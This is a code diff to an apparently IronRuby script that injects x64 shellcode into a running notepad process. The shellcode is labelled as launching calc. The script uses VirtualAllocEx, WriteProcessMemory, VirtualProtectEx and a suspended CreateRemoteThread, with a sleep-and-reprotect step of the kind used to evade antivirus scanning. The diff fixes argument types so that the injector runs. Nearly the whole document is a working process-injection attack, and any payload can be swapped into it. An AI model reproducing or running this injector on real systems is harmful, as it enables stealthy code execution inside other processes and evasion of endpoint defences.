@@ -3,7 +3,7 @@ include Microsoft::CSharp
 
 
 #x64 calc shellcde
-shellcode = System::Array[System::Byte].new [ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
+shellcode = System::Array[System::Byte].new([0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
     0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
     0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
@@ -19,7 +19,7 @@ shellcode = System::Array[System::Byte].new [ 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0
     0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
     0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
     0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
-    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00]
+    0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00])
 
 
 code = %@ 
@@ -35,19 +35,19 @@ code = %@
         public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);
 
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
 
         [DllImport("kernel32.dll")]
-        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
+        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);
 
         [DllImport("kernel32.dll")]
-        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern uint ResumeThread(IntPtr hThread);
+        public static extern uint ResumeThread(IntPtr hThread);
         }
     }
  @
@@ -67,23 +67,23 @@ targetProcess = System::Diagnostics::Process.GetProcessesByName("notepad")[0]
 assembly = generate(code)
 injection = assembly.get_types()[0]
 
-params = System::Array[System::Object].new([0x001F0FFF, false, targetProcess.Id])
+params = System::Array[System::Object].new([System::UInt32.new(0x001F0FFF), false, targetProcess.Id])
 procHandle = injection.get_method('OpenProcess').invoke(nil, params)
 mc = System::UInt32.new(0x3000)
 perw = System::UInt32.new(0x40)
-params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, shellcode.Length,  mc, perw])
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, System::UInt32.new(shellcode.Length),  mc, perw])
 resultPtr = injection.get_method('VirtualAllocEx').invoke(nil, params)
 bytesWritten = System::IntPtr.Zero
 params = System::Array[System::Object].new([procHandle, resultPtr, shellcode, shellcode.Length, bytesWritten])
 resultBool = injection.get_method('WriteProcessMemory').invoke(nil, params)
 oldProtect = System::UInt32.new(0)
-params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x01), oldProtect])
+params = System::Array[System::Object].new([procHandle, resultPtr, System::UIntPtr.new(shellcode.Length), System::UInt32.new(0x01), oldProtect])
 resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
 thread_id = System::IntPtr.Zero
-params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, 0, resultPtr, System::IntPtr.Zero, 0x00000004, thread_id])
+params = System::Array[System::Object].new([procHandle, System::IntPtr.Zero, System::UInt32.new(0), resultPtr, System::IntPtr.Zero, System::UInt32.new(0x00000004), thread_id])
 hThread = injection.get_method('CreateRemoteThread').invoke(nil, params)
 System::Threading::Thread.Sleep(20000)
-params = System::Array[System::Object].new([procHandle, resultPtr, shellcode.Length, System::UInt32.new(0x40), oldProtect])
+params = System::Array[System::Object].new([procHandle, resultPtr, System::UIntPtr.new(shellcode.Length), System::UInt32.new(0x40), oldProtect])
 resultBool = injection.get_method('VirtualProtectEx').invoke(nil, params)
 params = System::Array[System::Object].new([hThread])
 injection.get_method('ResumeThread').invoke(nil, params)
